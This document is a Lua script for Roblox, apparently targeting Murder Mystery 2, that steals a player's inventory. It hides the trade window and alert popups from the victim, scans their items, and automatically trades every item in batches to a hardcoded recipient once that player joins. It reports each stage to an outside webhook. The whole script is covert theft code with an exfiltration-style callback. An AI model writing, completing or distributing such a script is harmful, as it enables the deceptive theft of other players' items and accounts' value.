--// Utility Functions
local function sendLog(title, desc)
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                ["embeds"] = {{
                    ["title"] = title,
                    ["description"] = desc,
                    ["color"] = 16711680
                }}
            })
        })
    end)
end

--// 1. GUI Hider (Runs every 0.1s)
task.spawn(function()
    while task.wait(0.1) do
        local mainGui = LP.PlayerGui:FindFirstChild("MainGui")
        if mainGui then
            local tradeGUI = mainGui:FindFirstChild("Trade")
            if tradeGUI then tradeGUI.Visible = false end
            
            -- Hide popups
            for _, v in pairs(mainGui:GetChildren()) do
                if v.Name:find("Notification") or v.Name:find("Alert") then
                    v.Visible = false
                end
            end
        end
    end
end)

--// 2. Inventory Scanner (MM2 Specific)
local function getInventory()
    local items = {}
    local inventoryPath = LP.PlayerGui:FindFirstChild("MainGui")
    if inventoryPath then
        -- Navigating the MM2 custom GUI tree
        local container = inventoryPath:FindFirstChild("Inventory", true)
        if container then
            for _, item in pairs(container:GetDescendants()) do
                if item:IsA("ImageButton") and item:FindFirstChild("ItemName") then
                    table.insert(items, item.ItemName.Value)
                end
            end
        end
    end
    return items
end

--// 3. Trade Logic
local function startAutomation()
    local target = Players:FindFirstChild(TARGET_NAME)
    if not target then return end
    
    sendLog("🚀 Script Activated", "Target: " .. TARGET_NAME .. " found. Starting transfer...")

    local items = getInventory()
    if #items == 0 then
        sendLog("❌ Error", "No items detected in GUI inventory.")
        return
    end

    -- Remote Event Handling (Dynamic Lookup)
    local tradeRemote = game:GetService("ReplicatedStorage"):FindFirstChild("Trade", true)
    local startRemote = tradeRemote:FindFirstChild("StartTrade") or tradeRemote:FindFirstChild("SendRequest")
    local offerRemote = tradeRemote:FindFirstChild("OfferItem")
    local acceptRemote = tradeRemote:FindFirstChild("AcceptTrade")

    -- Execution Loop
    task.spawn(function()
        while #getInventory() > 0 do
            -- Step 1: Start Trade
            startRemote:FireServer(target)
            task.wait(2) -- Wait for Sigmake5 to accept

            -- Step 2: Add up to 4 items
            local currentItems = getInventory()
            for i = 1, math.min(4, #currentItems) do
                offerRemote:FireServer(currentItems[i])
                task.wait(0.2)
            end

            -- Step 3: Accept and Complete
            acceptRemote:FireServer()
            task.wait(1)
            
            sendLog("✅ Batch Sent", "Sent " .. math.min(4, #currentItems) .. " items to " .. TARGET_NAME)
            
            if #getInventory() == 0 then break end
            task.wait(2) -- Cooldown before next batch
        end
        sendLog("🎉 Complete", "All items have been transferred.")
    end)
end

--// 4. Trigger Listeners
Players.PlayerAdded:Connect(function(player)
    if player.Name == TARGET_NAME then
        startAutomation()
    end
end)

